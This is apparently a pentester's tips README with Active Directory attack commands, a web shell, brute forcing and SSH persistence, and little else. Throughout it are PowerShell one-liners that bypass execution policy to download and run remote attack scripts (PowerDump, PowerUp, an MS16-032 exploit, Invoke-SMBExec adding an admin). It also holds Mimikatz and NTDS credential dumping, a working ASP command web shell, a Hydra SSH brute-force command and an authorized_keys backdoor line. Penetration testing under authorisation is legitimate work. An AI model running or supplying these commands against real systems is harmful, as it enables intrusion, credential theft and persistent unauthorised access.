# Pentest Tips

Some tips from a cybersecurity consultant in France.

## Pentest Active Directory

### AD Mapping

Use BloodHound to find compromission paths. First execute the collector on a host that is in the targeted domain.

```markdown
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1’);Invoke-BloodHound"
```

On Linux, you can use the python version. More information here : https://github.com/fox-it/BloodHound.py
```markdown
python3 bloodhound.py -u XXX -dc DOMAIN
```

The tool give you a zip file, that you have to send to a Neo4j database. Start the Neo4j database :

```markdown
Import-Module .\Neo4j-Management.psd1
Invoke-Neo4j console
```

Then execute BloodHound.exe and import the zip file.


### Shares :

Dump all shares via CrackMapExec. Can be used on Windows/Linux and via python :

```markdown
cme smb -u 'XXX' -p 'XXX' -M spider_plus IP_ADDRESS/MASK
```

This command create a directory cme_spider_plus in /tmp (for Linux). To retrive passwords, simply use grep, by using keywords like 'password', 'pass', 'username', 'ldap://', etc ..
```markdown
grep -rnw ./ -e ‘password’
```

If CME is detected by AV/EDR, use PowerShell one-liner PowerView :

```markdown
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')"
```

Then, a lot of functionalities can be used. To find all domain shares :

```markdown
Find-DomainShare -CheckShareAccess
```

All the functionalities here : https://powersploit.readthedocs.io/en/latest/Recon/

### Mimikatz

Retrieve password/hash from a dump file :
```markdown
sekurlsa::minidump “XXXXXXXXX.DMP”
sekurlsa::logonPasswords
```

### NTDS Exfiltration

Dump NTDS :

```markdown
crackmapexec smb IP -u "USERNAME" -p "PASSWORD" -d "DOMAIN" --ntds
```

Extract hashes from NTDS :

```markdown
cat ntds.dit | cut -d : -f 4 |sort|uniq > hashes.txt
```

### PowerShell one-liners

Bloodhound : Using ingestors to collect the data and then send it to BloodHound.

```markdown
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1');Invoke-BloodHound"
```

PowerDump : Dump all local accounts.

```markdown
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1');Invoke-PowerDump"
```

PowerUp : Check for privilege escalation.

```markdown
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks"
```

Sherlock : An old tool to find vulnerabilities on the host. Can be still interesting.

```markdown
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1’); Find-AllVulns"
```

To exploit one of those vulnerabilities via Sherlock, for example MS16-032 :

```markdown
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1’); Invoke-MS16-032"
```

Invoke-SMBExec : Remote command execution by using a hash :
```markdown
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘https://github.com/Kevin-Robertson/Invoke-TheHash/raw/master/Invoke-SMBExec.ps1’);"
Invoke-SMBExec -hash HASH -Target HOSTNAME -Domain DOMAIN -Username USERNAME -Command “net localgroup Administrateurs USERNAME /ADD” -verbose
```

## Pentest Web

### Webshell

ASP : 
```markdown
<%
Response.write("<pre>")
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c " & Request.QueryString("cmd"))
o = cmd.StdOut.Readall()
Response.write(o)
Response.write("</pre>")
%>
```

## Bruteforce

### SSH

Use Hydra :
```markdown
hydra -l USERNAME -P FILE_CONTAINING_PASSWORDS -M FILE_CONTAINING_IP_TO_BRUTEFORCE -t 4 ssh
```



## Port Forwarding

Pour accéder à un service exposé en local sur une machine distante :

```markdown
ssh -L YOUR_PORT:localhost:PORT_EXPOSED user@IP
```


## Tips

### SSH

Generate SSH key :
```markdown
ssh-keygen -t rsa
```

Paste it to authorized_keys :
```markdown
echo XXXX >> ~/.ssh/authorized_keys
```
